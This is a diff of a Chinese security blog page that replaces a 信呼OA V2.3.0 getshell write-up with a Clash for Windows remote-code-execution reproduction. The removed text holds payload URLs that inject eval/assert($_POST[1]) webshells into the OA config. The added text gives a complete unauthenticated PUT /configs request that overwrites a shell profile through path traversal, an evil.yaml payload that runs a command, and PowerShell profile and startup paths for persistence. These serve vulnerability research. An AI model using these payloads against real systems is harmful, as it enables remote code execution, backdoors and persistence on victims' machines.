@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="信呼OA V2.3.0 治标不治本的配置文件getshell重新利用 | 九世的博客">
+  <title>clash文件覆写导致RCE | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="clash文件覆写导致RCE | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1972,9 +1972,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-信呼OA-V2-3-0-治标不治本的配置文件getshell重新利用" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-clash文件覆写导致RCE" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</h1>
+        <h1 class="article-title">clash文件覆写导致RCE</h1>
     
     <div class="article-meta">
         
@@ -1983,14 +1983,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-10-18 22:09:23">2021-10-18 21:56</time>
+        创建时间:<time class="date" title="更新时间: 2023-06-21 11:20:28">2023-06-19 18:03</time>
         
     </div>
     <div class="article-meta">
@@ -2012,7 +2012,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码跟踪"><span class="toc-text">代码跟踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#死灰复燃"><span class="toc-text">死灰复燃</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境准备"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码跟踪"><span class="toc-text">代码跟踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2027,26 +2027,48 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p>
-<h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p>
-<pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2F
-http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961
+        <h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>影响版本：&lt;=0.19.8<br>复现环境：<br>windows+clash for windows+内核clash-windows-amd64-v1.15.0+未设置secret    </p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>默认先走授权，有secret无法利用<br>（2021年后默认随机UUID的secret，端口随机）<br><img src="https://s1.ax1x.com/2023/06/21/pCGekqS.png" alt=""><br><img src="https://s1.ax1x.com/2023/06/21/pCGeZ5j.png" alt=""></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>API请求包    </p>
+<pre><code>PUT /configs?force=true HTTP/1.1
+Host: 127.0.0.1:9090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 326
 
-a:函数名称
-m:类名称
-d:处理文件文件夹父路径名称
-</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p>
-<p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p>
-<p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p>
-<p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p>
-<p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p>
-<h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p>
-<p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>
+
+{&quot;payload&quot;:&quot;mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: &#39;http://127.0.0.1:9999/evil.yaml&#39;\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204&quot;}
+</code></pre><p>windows下的payload<br>vps开http.server<br>evil.yaml   </p>
+<pre><code>calc.exe &amp;&amp; echo :
+proxies:
+  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}
+#&gt;
+</code></pre><p>通过利用powershell自定义.profile来执行命令。当用户打开powershell将触发<br>（还需要powershell运行脚本执行才能成功）    </p>
+<pre><code>1、%windir%\system32\WindowsPowerShell\v1.0\profile.ps1
+它作用于所有用户、所有的Shell。
+
+
+2、%windir%\system32\WindowsPowerShell\v1.0\ Microsoft.PowerShell_profile.ps1
+作用于所有用户，但只作用于Microsoft.PowerShell这个shell。这个我也没懂是什么意思，难道还有不是PowerShell的PowerShell shell？呃，有点像绕口令。
+
+
+3、%UserProfile%\My Documents\WindowsPowerShell\profile.ps1
+作用于当前用户的所有shell。
+
+
+4、%UserProfile%\My Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+作用于当前用户的Microsoft.PowerShell这个shell。
+</code></pre><p><img src="https://files.catbox.moe/t6x1gl.gif" alt=""></p>
+<p>开机自启路径<br>（有杀毒纯纯白给）<br><img src="https://s1.ax1x.com/2023/06/21/pCGmCFJ.png" alt=""></p>
+<h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>可以看到updateConfigs函数处理，只要json格式正确直接进行下一步<br><img src="https://s1.ax1x.com/2023/06/21/pCGmakQ.png" alt=""></p>
+<p>最后解析json里的payload。获取路径，拼接路径，根据类型进行处理。最后调用NewProxySetProvider函数<br><img src="https://s1.ax1x.com/2023/06/21/pCGmwfs.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2023/06/21/pCGmr60.png" alt=""><br><a href="https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/4d66da2277ddaf41f83bd889b064c0a584f7a8ad/adapter/provider/parser.go#L4</a>     </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作者最早添加更新配置文件的API都加了安全验证<a href="https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/commit/9cfd26d44062c8d0811395cf944024bb680705b5</a><br>能被利用纯属自己不设置secret<br><a href="https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/blob/9cfd26d44062c8d0811395cf944024bb680705b5/hub/route/server.go</a><br><img src="https://s1.ax1x.com/2023/06/21/pCGmfh9.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/" target="_blank" rel="noopener">https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2056,12 +2078,12 @@ d:处理文件文件夹父路径名称
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</p>
+    <p><span class="copy-title">文章标题:</span>clash文件覆写导致RCE</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2021-10-18, 21:56:13</p>
-    <p><span class="copy-title">最后更新:</span>2021-10-18, 22:09:23</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3541f020.html" title="信呼OA V2.3.0 治标不治本的配置文件getshell重新利用">http://jiushill.github.io/posts/3541f020.html</a>
+    <p><span class="copy-title">发布时间:</span>2023-06-19, 18:03:45</p>
+    <p><span class="copy-title">最后更新:</span>2023-06-21, 11:20:28</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d0a451b7.html" title="clash文件覆写导致RCE">http://jiushill.github.io/posts/d0a451b7.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
